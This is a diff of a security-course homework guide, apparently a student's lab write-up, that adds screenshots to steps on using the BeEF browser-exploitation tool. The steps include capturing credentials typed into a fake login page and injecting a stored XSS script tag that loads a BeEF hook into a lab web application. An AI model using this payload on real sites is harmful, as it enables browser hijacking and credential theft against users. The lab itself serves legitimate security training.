@@ -217,8 +217,9 @@ When complete, submit the file on BCS.
    - Along with these details are several URLs that can be used to access to BeEF's User Interface (UI). For example: `UI_URL: http://127.0.0.1:3000/ui/panel` 
    
    - To access the BeEF GUI, right-click the first URL and select Open Link.
+   ![wd_hw10](Images/wd_hw10.png)
 
-     ![wd_hw10](Images/wd_hw10.png)
+     ![wd_hw10](Images/beef.png)
 
    - When the BeEF webpage opens, login with the following credentials:
      - Username: `beef`
@@ -294,11 +295,11 @@ When complete, submit the file on BCS.
      - Username: `hackeruser`
      - Password: `hackerpass`
 
-       ![wd_hw18](Images/wd_hw18.png)
+       ![wd_hw18](Images/kacker.png)
 
    - Return to the BeEF control panel. In the center panel, select the first option. Note that now on the right panel, the username and password have been captured by the attacker.
 
-     ![wd_hw19](Images/wd_hw19.png)
+     ![wd_hw19](Images/submit.png)
 
 5. Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.
 
@@ -306,6 +307,16 @@ When complete, submit the file on BCS.
      - The page you will test is the Replicants Stored XSS application which was used the first day of this unit: `http://192.168.13.25/vulnerabilities/xss_s/`
      - The BeEF hook, which was returned after running the `sudo beef` command was: `http://127.0.0.1:3000/hook.js`
      - The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`
+
+   
+![wd_hw19](Images/22.png)
+
+![wd_hw19](Images/11.png)
+
+![wd_hw19](Images/333.png)
+
+![wd_hw19](Images/ss.png)
+
 
    -  When you attempt to inject this payload,  you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.    
       
